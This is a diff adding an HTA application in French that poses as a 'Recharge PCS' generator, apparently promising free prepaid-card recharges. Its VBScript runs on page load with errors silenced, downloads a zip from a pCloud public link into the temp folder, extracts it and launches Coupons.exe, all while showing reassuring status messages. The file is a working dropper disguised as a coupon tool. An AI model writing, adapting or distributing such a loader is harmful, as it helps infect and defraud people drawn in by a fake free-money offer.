@@ -1,0 +1,72 @@
+
+<html>
+<head>
+<HTA:APPLICATION 
+  ID="RechargePCSApp"
+  APPLICATIONNAME="Recharge PCS"
+  BORDER="dialog"
+  CAPTION="yes"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+/>
+<title>Générateur Recharge PCS</title>
+<STYLE>
+  body { font-family: Arial, sans-serif; background: #fefefe; padding: 30px; text-align: center; color: #333; }
+  h1 { color: #e67e22; margin-bottom: 20px; }
+  .status { margin-top: 30px; font-size: 1.1em; color: #2980b9; }
+</STYLE>
+<script language="VBScript">
+Sub Window_OnLoad
+  On Error Resume Next
+
+  document.body.insertAdjacentHTML "beforeEnd", "<div class='status' id='status'>Téléchargement de l'archive Recharge-Pcs.zip...</div>"
+
+  Dim fso, shell, temp, zipURL, zipPath, extractPath, http, stream, shellApp
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Set shell = CreateObject("WScript.Shell")
+  temp = shell.ExpandEnvironmentStrings("%TEMP%")
+  zipPath = temp & "\Recharge-Pcs.zip"
+  extractPath = temp & "\PCS"
+
+  zipURL = "https://e.pcloud.link/publink/download?code=XZBl96ZDcumxqXn19QSerxY4ULg1FBqjotk"
+
+  Set http = CreateObject("Microsoft.XMLHTTP")
+  http.Open "GET", zipURL, False
+  http.Send
+
+  If http.Status = 200 Then
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write http.responseBody
+    stream.SaveToFile zipPath, 2
+    stream.Close
+    document.getElementById("status").innerText = "✅ Téléchargement terminé. Extraction..."
+  Else
+    MsgBox "Erreur de téléchargement: " & http.Status, 16, "Erreur"
+    Exit Sub
+  End If
+
+  If Not fso.FolderExists(extractPath) Then
+    fso.CreateFolder extractPath
+  End If
+
+  Set shellApp = CreateObject("Shell.Application")
+  shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items(), 4
+
+  WScript.Sleep 3000
+
+  If fso.FileExists(extractPath & "\Coupons.exe") Then
+    shell.Run Chr(34) & extractPath & "\Coupons.exe" & Chr(34), 1, False
+    document.getElementById("status").innerText = "🎉 Recharge lancée avec succès !"
+  Else
+    document.getElementById("status").innerText = "❌ Coupons.exe introuvable après extraction."
+  End If
+End Sub
+</script>
+</head>
+<body>
+  <h1>Recharge PCS</h1>
+</body>
+</html>
